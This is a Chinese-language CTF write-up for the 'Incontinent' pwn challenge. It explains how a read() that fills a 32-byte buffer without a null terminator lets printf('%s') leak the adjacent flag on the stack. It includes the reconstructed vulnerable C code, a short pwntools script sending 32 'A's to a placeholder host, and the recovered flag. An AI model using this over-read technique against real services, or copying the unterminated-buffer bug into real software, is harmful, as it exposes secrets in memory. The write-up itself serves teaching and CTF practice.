# Incontinent

## 题目简述

远程程序先把 flag 放入栈上的一个局部字符数组，再从标准输入读取用户内容并以 `%s` 回显。官方说明只给出“发送约 32 个 `A` 会泄露 flag”；对分发二进制反编译后可以确认，用户缓冲区大小为 32 字节，但 `read(0, buf, 0x32)` 最多写入 50 字节，而且不会自动补字符串终止符。

## 解题过程

关键逻辑可还原为：

```c
char input[32];
char secret[112];

strcpy(secret, FLAG);
read(0, input, 0x32);
printf("You said: ");
printf("%s", input);
```

`input` 与 `secret` 在当前栈帧中相邻。正常输入较短时，输入末尾残留的零字节会终止 `%s`；若发送恰好 32 个非零字节，`input` 内没有 `\0`，`printf("%s", input)` 就会继续读取相邻的 `secret`，直到之后遇到零字节。

最小交互如下：

```python
from pwn import *

p = remote("challenge.example", 31337)
p.sendafter(b"say to it?", b"A" * 32)
print(p.recvall().decode(errors="replace"))
```

回显中 32 个 `A` 后紧跟远程栈上的 flag：

```text
byuctf{incontinent_is_one_of_my_favorite_words_lol}
```

## 方法总结

- 核心技巧：利用未终止的定长输入被 `%s` 当作 C 字符串打印，造成相邻栈数据越界泄露。
- 识别信号：`read` 向字符数组写满容量、随后用 `%s` 输出且没有显式补 `\0`，是典型的 over-read。
- 复用要点：这不是依靠覆盖返回地址的栈溢出；决定性效果是字符串边界缺失。输入需要填满缓冲区并避免内嵌零字节。
